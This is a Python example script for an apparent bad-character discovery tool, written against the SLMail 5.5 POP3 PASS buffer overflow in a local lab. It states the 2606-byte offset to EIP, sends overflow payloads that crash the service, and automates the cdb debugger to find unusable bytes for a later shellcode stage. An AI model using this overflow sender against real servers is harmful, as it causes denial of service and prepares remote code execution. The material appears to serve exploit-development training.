"""
slmail_pass.py  -  Bad char discovery for SLMail 5.5 PASS overflow
===================================================================

Target:   SLMail 5.5.0 Mail Server
Protocol: POP3 (port 110)
Command:  PASS  (password field)
Offset:   2606 bytes to EIP (confirmed via pattern_offset)
Bad chars already known from protocol analysis: 00 0a 0d

This example uses the importable API to handle POP3's stateful
login sequence (USER before PASS). The CLI --prefix approach does
not work here because the server sends a banner and requires a
response before accepting the PASS command.

HOW TO USE
----------
1. Start SLMail on the Windows VM (or it may already run as a service).
2. Start cdb attached to slmail.exe, OR let this script manage it.
3. Adjust CDB_PATH and TARGET_EXE for your environment.
4. Run:  python slmail_pass.py

EXPECTED OUTPUT (abridged)
--------------------------
[*] badchar_auto.py v1.0.0
[*] Iter  1: 252 bytes to test  |  bad so far: none
[!] Found: \x0a \x0d ...
[*] Iter  2: ...
[+] Clean pass.
[+] Confirmed bad chars (N):
    \x00 \x0a \x0d ...
"""

import socket
import sys
import os

# Allow running from the examples\ directory without installation
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from badchar_auto import BadCharOrchestrator, Stage, MAGIC_BINARY

# ---------------------------------------------------------------------------
# Configuration  -  edit these for your environment
# ---------------------------------------------------------------------------

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 110

# Payload geometry: PASS [A*2606][MAGIC][test bytes][padding]\r\n
OFFSET     = 2606
TOTAL_SIZE = 3500

# cdb.exe path - adjust to match your Debugging Tools installation
CDB_PATH   = r"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe"
TARGET_EXE = r"C:\Program Files (x86)\SLMail\SLmail.exe"

# Bytes to exclude entirely. 00 = null terminator. 0a/0d = LF/CR (POP3 delimiters).
EXCLUDE = (0x00, 0x0a, 0x0d)

# ---------------------------------------------------------------------------
# Protocol sender
# ---------------------------------------------------------------------------

def send_slmail_pass(payload: bytes) -> None:
    """
    POP3 login sequence followed by a PASS command containing the payload.

    The receiver must send:
      USER <name>\\r\\n
      <- +OK
      PASS <payload>\\r\\n

    Note: recv() calls are best-effort. SLMail is lenient about timing.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    try:
        s.connect((TARGET_HOST, TARGET_PORT))

        # +OK POP3 server ready
        banner = s.recv(1024)
        if not banner.startswith(b"+OK"):
            raise RuntimeError("Unexpected banner: {}".format(banner[:40]))

        s.sendall(b"USER test\r\n")
        resp = s.recv(1024)
        if not resp.startswith(b"+OK"):
            raise RuntimeError("USER rejected: {}".format(resp[:40]))

        s.sendall(b"PASS " + payload + b"\r\n")
        # Do not wait for a response - the server will likely crash or
        # the connection will drop. That is expected.
        try:
            s.recv(1024)
        except Exception:
            pass
    finally:
        s.close()

# ---------------------------------------------------------------------------
# Stage definition
# ---------------------------------------------------------------------------

# SLMail uses msvcrt!strcpy internally. The destination buffer is arg1.
# On cdecl x86: esp+4 = dst, esp+8 = src at function entry.
# We break at entry, save poi(@esp+4) in $t0, step to ret (pt), then dump $t0.
STAGE = Stage(
    name       = "slmail_strcpy",
    breakpoint = "msvcrt!strcpy",
    dump_expr  = "poi(@esp+4)",
    dump_size  = 512,
    step_mode  = "pt",
)

# ---------------------------------------------------------------------------
# Run
# ---------------------------------------------------------------------------

def main() -> int:
    orch = BadCharOrchestrator(
        stage            = STAGE,
        sender           = send_slmail_pass,
        offset           = OFFSET,
        total_size       = TOTAL_SIZE,
        exclude          = EXCLUDE,
        magic            = MAGIC_BINARY,
        dump_dir         = r"C:\badchar",
        cdb_path         = CDB_PATH,
        target_exe       = TARGET_EXE,
        timeout          = 20,   # SLMail can be slow to respond
        restart_on_crash = True,
        restart_delay    = 2.0,  # give the service time to restart
    )

    orch.run_full(max_iterations=30)
    return 0


if __name__ == "__main__":
    sys.exit(main())
